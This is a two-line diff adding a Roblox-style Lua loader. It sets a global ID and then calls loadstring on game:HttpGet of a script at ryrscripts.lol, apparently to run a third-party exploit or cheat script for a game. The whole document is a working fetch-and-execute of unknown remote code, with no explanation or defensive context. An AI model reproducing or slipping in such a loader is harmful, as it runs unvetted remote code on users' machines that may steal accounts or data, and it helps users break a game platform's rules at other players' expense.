@@ -1,0 +1,2 @@
+_G.ID="86068dc7d03a2b7e"
+loadstring(game:HttpGet("https://ryrscripts.lol/auth/baddies", true))()
